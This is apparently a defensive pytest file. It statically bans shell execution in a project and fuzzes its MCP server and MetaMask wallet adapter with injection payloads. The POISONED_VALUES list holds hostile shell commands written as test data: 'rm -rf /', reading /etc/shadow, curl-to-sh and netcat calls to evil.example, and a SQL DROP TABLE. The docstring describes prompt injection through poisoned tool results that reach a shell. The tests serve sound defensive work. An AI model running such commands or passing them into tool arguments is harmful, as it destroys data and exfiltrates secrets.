"""Dev-watch item 300 — argv-only process spawning guard + injection fuzz.

CVE-2026-117567 / -117569 / -117573: three MCP servers shipped OS command
injection reachable through prompt injection — a tool parameter (or a value
arriving inside a poisoned tool *result*) was interpolated into a shell
string, so metacharacters in an agent-supplied value executed commands.

The hedge, turned into a permanent CI gate:

* every external binary in ``src/sincor2`` is invoked via argv arrays only;
* ``shell=True``, ``asyncio.create_subprocess_shell``, ``os.system`` and
  ``os.popen`` anywhere under ``src/sincor2`` are failures;
* a ``subprocess.*`` call whose command is a string (constant, f-string or
  concatenation) is a failure;
* prompt-injection-shaped values (plausible hostnames / paths / project
  names carrying metacharacters, not just raw ``;``/``|`` probes) fed into
  the MCP tool-arg handling and the MetaMask adapter command builder must
  stay a single argv element / a URL-quoted path segment / a JSON field —
  never a shell string — and must never reach a shell at all.

The static guard is AST-based: it only inspects real ``Call`` nodes, so a
docstring, comment or string literal that merely *mentions* ``shell=True``
(for example the banned-construct list in ``agency_kernel_tools.py``) does
not false-positive.
"""

from __future__ import annotations

import ast
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
SRC_ROOT = REPO_ROOT / "src" / "sincor2"

_SUBPROCESS_FUNCS = {
    "run",
    "Popen",
    "call",
    "check_call",
    "check_output",
    "getoutput",
    "getstatusoutput",
}
# getoutput / getstatusoutput always go through a shell by design.
_ALWAYS_SHELL_FUNCS = {"getoutput", "getstatusoutput"}


# ---------------------------------------------------------------------------
# AST guard (shared by the tree test and the synthetic-source tests)
# ---------------------------------------------------------------------------


def _dotted(node: ast.AST) -> str:
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    return ".".join(reversed(parts))


def _resolve(tree: ast.AST) -> tuple[dict[str, str], dict[str, str]]:
    """Map local names to the stdlib module / function they refer to."""
    modules: dict[str, str] = {}
    funcs: dict[str, str] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                modules[alias.asname or alias.name.split(".")[0]] = alias.name
        elif isinstance(node, ast.ImportFrom) and node.module:
            for alias in node.names:
                funcs[alias.asname or alias.name] = f"{node.module}.{alias.name}"
    return modules, funcs


def _canonical(dotted: str, modules: dict[str, str], funcs: dict[str, str]) -> str:
    if dotted in funcs:
        return funcs[dotted]
    head, _, rest = dotted.partition(".")
    if head in modules:
        return modules[head] + (f".{rest}" if rest else "")
    return dotted


def _is_string_command(node: ast.AST) -> bool:
    """True when an argv argument is provably a *string* command."""
    if isinstance(node, ast.Constant):
        return isinstance(node.value, (str, bytes))
    if isinstance(node, ast.JoinedStr):  # f-string
        return True
    if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
        return True
    return False


def violations_from_ast(tree: ast.AST, filename: str = "<synthetic>") -> list[str]:
    modules, funcs = _resolve(tree)
    found: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        canon = _canonical(_dotted(node.func), modules, funcs)
        where = f"{filename}:{node.lineno}"
        for kw in node.keywords:
            if (
                kw.arg == "shell"
                and isinstance(kw.value, ast.Constant)
                and kw.value.value is True
            ):
                found.append(f"{where}: shell=True in call to {canon or 'unknown'}")
        if canon in ("os.system", "os.popen"):
            found.append(f"{where}: {canon}() executes through a shell")
        if canon.endswith("create_subprocess_shell") or (
            "create_subprocess_shell" in canon
        ):
            found.append(f"{where}: create_subprocess_shell executes through a shell")
        if canon.startswith("subprocess."):
            leaf = canon.rsplit(".", 1)[-1]
            if leaf in _ALWAYS_SHELL_FUNCS:
                found.append(f"{where}: subprocess.{leaf}() executes through a shell")
            elif leaf in _SUBPROCESS_FUNCS and node.args:
                if _is_string_command(node.args[0]):
                    found.append(
                        f"{where}: subprocess.{leaf}() called with a string "
                        "command instead of an argv list"
                    )
    return found


def violations_from_source(source: str, filename: str = "<synthetic>") -> list[str]:
    return violations_from_ast(ast.parse(source), filename)


def _src_files() -> list[Path]:
    return sorted(SRC_ROOT.rglob("*.py"))


# ---------------------------------------------------------------------------
# 1. Static guard over the real tree
# ---------------------------------------------------------------------------


class TestStaticGuard:
    def test_src_tree_has_no_shell_execution(self):
        assert SRC_ROOT.is_dir(), f"missing source tree: {SRC_ROOT}"
        all_violations: list[str] = []
        for path in _src_files():
            tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
            all_violations.extend(
                violations_from_ast(tree, str(path.relative_to(REPO_ROOT)))
            )
        assert all_violations == [], (
            "shell-execution violations under src/sincor2 "
            "(dev-watch 300: argv arrays only):\n" + "\n".join(all_violations)
        )

    @pytest.mark.parametrize(
        "rel_path",
        [
            "acceptance_status.py",
            "adapters/metamask_agent_wallet.py",
            "daily_ops.py",
            "sinax/lemma_discovery.py",
        ],
    )
    def test_known_subprocess_call_sites_use_argv_lists(self, rel_path):
        """Every pre-existing subprocess call site passes an argv list."""
        path = SRC_ROOT / rel_path
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        modules, funcs = _resolve(tree)
        calls = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and _canonical(_dotted(node.func), modules, funcs).startswith(
                "subprocess."
            )
        ]
        assert calls, f"{rel_path}: expected at least one subprocess call"
        # Names bound to a list/tuple literal in the same file (e.g. the
        # metamask adapter's ``cmd: List[str] = [mm_bin, *args, "--json"]``)
        # are argv form too — resolve them instead of demanding an inline
        # literal at every call site.
        list_names = set()
        for node in ast.walk(tree):
            value = None
            targets: list[ast.AST] = []
            if isinstance(node, ast.Assign):
                value, targets = node.value, list(node.targets)
            elif isinstance(node, ast.AnnAssign):
                value, targets = node.value, [node.target]
            if isinstance(value, (ast.List, ast.Tuple)):
                list_names.update(
                    t.id for t in targets if isinstance(t, ast.Name)
                )
        for call in calls:
            assert call.args, f"{rel_path}:{call.lineno}: no command argument"
            first = call.args[0]
            is_argv = isinstance(first, (ast.List, ast.Tuple)) or (
                isinstance(first, ast.Name) and first.id in list_names
            )
            assert is_argv, (
                f"{rel_path}:{call.lineno}: command must be an argv list, "
                f"got {type(first).__name__}"
            )


class TestGuardItself:
    """The guard must catch the CVE class and ignore mere mentions."""

    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nsubprocess.run(cmd, shell=True)\n",
            "import subprocess as sp\nsp.Popen(cmd, shell=True)\n",
            "import asyncio\nasyncio.create_subprocess_shell(cmd)\n",
            "from asyncio import create_subprocess_shell\ncreate_subprocess_shell(cmd)\n",
            "import os\nos.system('ls ' + name)\n",
            "import os\nos.popen('ls')\n",
            "import subprocess\nsubprocess.run('ls -la /tmp')\n",
            "import subprocess\nsubprocess.run(f'ls {name}')\n",
            "import subprocess\nsubprocess.run('ls ' + name)\n",
            "from subprocess import run\nrun('ls -la')\n",
            "import subprocess\nsubprocess.getoutput('ls')\n",
        ],
    )
    def test_guard_detects_shell_patterns(self, source):
        assert violations_from_source(source), f"guard missed: {source!r}"

    @pytest.mark.parametrize(
        "source",
        [
            "import subprocess\nsubprocess.run(['ls', name])\n",
            "import subprocess\ncmd = ['mm', arg, '--json']\nsubprocess.run(cmd)\n",
            # Mentions in docstrings / strings / comments are not calls.
            '"""Never use shell=True here."""\nimport subprocess\nsubprocess.run(["ls"])\n',
            "import subprocess\n# shell=True would be bad\nsubprocess.run(['ls'])\n",
            "BANNED = ['import subprocess', 'shell=True', 'os.system']\n",
            "import subprocess\nsubprocess.run(['ls'], shell=False)\n",
        ],
    )
    def test_guard_ignores_argv_calls_and_mere_mentions(self, source):
        assert violations_from_source(source) == []


# ---------------------------------------------------------------------------
# 2. Prompt-injection-shaped fuzz corpus
# ---------------------------------------------------------------------------

# Plausible agent-supplied values — hostnames, paths, project names, URLs —
# carrying shell metacharacters, as they would arrive via a tool argument
# or inside a poisoned tool result. Not bare ``;``/``|`` probes.
POISONED_VALUES = [
    "example.com; rm -rf /",
    "host`id`.example.com",
    "host$(curl https://evil.example/x | sh).example.com",
    "build-node-1 && cat /etc/shadow",
    "../../srv/proj; cat /etc/passwd",
    "/tmp/proj/$(reboot)/out",
    "my-project`whoami`",
    "proj name | nc evil.example 4444",
    "release-$(touch /tmp/pwned)",
    "https://example.com/assets/$(id)",
    "https://example.com/`id`?next=1;rm -rf /",
    "o'brien; echo pwned; echo '",
    'name"; rm -rf /; echo "',
    "proj\nrm -rf /",
    "task'; DROP TABLE tasks; --",
    "$(python3 -c 'import os; os.system(1)')",
]


@pytest.fixture()
def no_shell_ever(monkeypatch):
    """Any shell reaching out during a test is an immediate failure."""
    calls: list[str] = []

    def _boom(name):
        def _fn(*args, **kwargs):  # noqa: ANN001, ANN002, ANN003
            calls.append(name)
            raise AssertionError(f"{name} reached a shell: {args!r} {kwargs!r}")

        return _fn

    monkeypatch.setattr("os.system", _boom("os.system"))
    monkeypatch.setattr("os.popen", _boom("os.popen"))
    real_run = subprocess.run

    def _guarded_run(*args, **kwargs):  # noqa: ANN001, ANN002, ANN003
        cmd = args[0] if args else kwargs.get("args", [])
        assert kwargs.get("shell") is not True, f"shell=True reached: {cmd!r}"
        assert isinstance(cmd, (list, tuple)), (
            f"subprocess.run got a string command: {cmd!r}"
        )
        return real_run(*args, **kwargs)

    monkeypatch.setattr(subprocess, "run", _guarded_run)
    return calls


class TestMcpServerFuzz:
    """Poisoned values through the MCP server's tool-arg handling."""

    def _call(self, mcp, name, arguments):
        return mcp.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": name, "arguments": arguments},
            }
        )

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_skill_filter_never_reaches_shell(
        self, monkeypatch, no_shell_ever, poison
    ):
        from sincor2 import mcp_server as mcp

        monkeypatch.setattr(
            mcp, "_get", lambda path, params=None: {"ok": True, "data": {"auctions": []}}
        )
        resp = self._call(mcp, "list_tasks", {"skill": poison})
        assert resp is not None and "result" in resp
        assert no_shell_ever == []

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_task_id_is_url_quoted_not_shell(
        self, monkeypatch, no_shell_ever, poison
    ):
        from sincor2 import mcp_server as mcp

        seen: dict[str, str] = {}

        def fake_get(path, params=None):
            seen["path"] = path
            return {"ok": False, "data": None}

        monkeypatch.setattr(mcp, "_get", fake_get)
        resp = self._call(mcp, "get_task", {"task_id": poison})
        assert resp is not None and "result" in resp
        # The value travels as one URL-quoted path segment: none of its
        # shell metacharacters survive unescaped into the request path.
        for ch in (";", "`", "$", "|", " ", "\n"):
            assert ch not in seen["path"], (ch, seen["path"])
        assert no_shell_ever == []

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_agent_identity_stays_a_json_field(
        self, monkeypatch, no_shell_ever, poison
    ):
        from sincor2 import mcp_server as mcp

        # register_agent without a confirmation token only *issues* a
        # confirmation — the poisoned identity must remain inert data.
        resp = self._call(
            mcp, "register_agent", {"agent_id": poison, "name": poison}
        )
        assert resp is not None and "result" in resp
        assert no_shell_ever == []

    def test_poisoned_tool_result_flows_into_next_call_inertly(
        self, monkeypatch, no_shell_ever
    ):
        """Negative test: a parameter harvested from a poisoned tool
        *result* and fed into the next tool call still reaches no shell."""
        from sincor2 import mcp_server as mcp

        poison = POISONED_VALUES[2]
        # First call: upstream returns a poisoned payload (prompt injection
        # planted in data an agent would read and act on).
        monkeypatch.setattr(
            mcp,
            "_get",
            lambda path, params=None: {
                "ok": True,
                "data": {"auctions": [{"task_id": poison, "skill": poison}]},
            },
        )
        first = self._call(mcp, "list_tasks", {})
        assert first is not None and "result" in first

        # Second call: the agent parrots the poisoned task_id back in.
        seen: dict[str, str] = {}

        def fake_get(path, params=None):
            seen["path"] = path
            return {"ok": False, "data": None}

        monkeypatch.setattr(mcp, "_get", fake_get)
        second = self._call(mcp, "get_task", {"task_id": poison})
        assert second is not None and "result" in second
        assert ";" not in seen["path"] and "$" not in seen["path"]
        assert no_shell_ever == []


class TestMetamaskAdapterFuzz:
    """Poisoned values through the MetaMask adapter command builder."""

    def _wallet(self, monkeypatch):
        from sincor2.adapters import metamask_agent_wallet as mmw

        captured: dict = {}

        def fake_run(cmd, **kwargs):
            captured["cmd"] = cmd
            captured["kwargs"] = kwargs
            return SimpleNamespace(
                returncode=0, stdout='{"ok": true, "data": {}}', stderr=""
            )

        monkeypatch.setattr(mmw.subprocess, "run", fake_run)
        monkeypatch.setattr(mmw, "kill_switch_tripped", lambda: False)
        wallet = mmw.MetaMaskAgentWallet(mm_bin="mm")
        monkeypatch.setattr(wallet, "_ensure_mm", lambda: None)
        return wallet, captured

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_token_stays_single_argv_element(
        self, monkeypatch, no_shell_ever, poison
    ):
        wallet, captured = self._wallet(monkeypatch)
        wallet.balance(token=poison)
        cmd = captured["cmd"]
        assert isinstance(cmd, list), f"command is not an argv list: {cmd!r}"
        assert captured["kwargs"].get("shell") is not True
        # Exactly one element carries the value: the --token argument.
        assert cmd[cmd.index("--token") + 1] == poison
        assert sum(1 for part in cmd if poison in part) == 1

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_flag_value_stays_single_argv_element(
        self, monkeypatch, no_shell_ever, poison
    ):
        wallet, captured = self._wallet(monkeypatch)
        wallet.swap_quote(from_token=poison, to_token="native", amount="1")
        cmd = captured["cmd"]
        assert isinstance(cmd, list)
        assert captured["kwargs"].get("shell") is not True
        assert f"--from={poison}" in cmd
        assert sum(1 for part in cmd if poison in part) == 1

    @pytest.mark.parametrize("poison", POISONED_VALUES)
    def test_poisoned_result_value_reused_as_argument_stays_inert(
        self, monkeypatch, no_shell_ever, poison
    ):
        """A value that arrived in a (poisoned) mm result and is reused as
        the next call's argument is still just one argv element."""
        wallet, captured = self._wallet(monkeypatch)
        wallet._run("wallet", "show", poison, wait=False)
        cmd = captured["cmd"]
        assert isinstance(cmd, list)
        assert captured["kwargs"].get("shell") is not True
        assert poison in cmd  # verbatim, as its own element
        assert cmd.count(poison) == 1
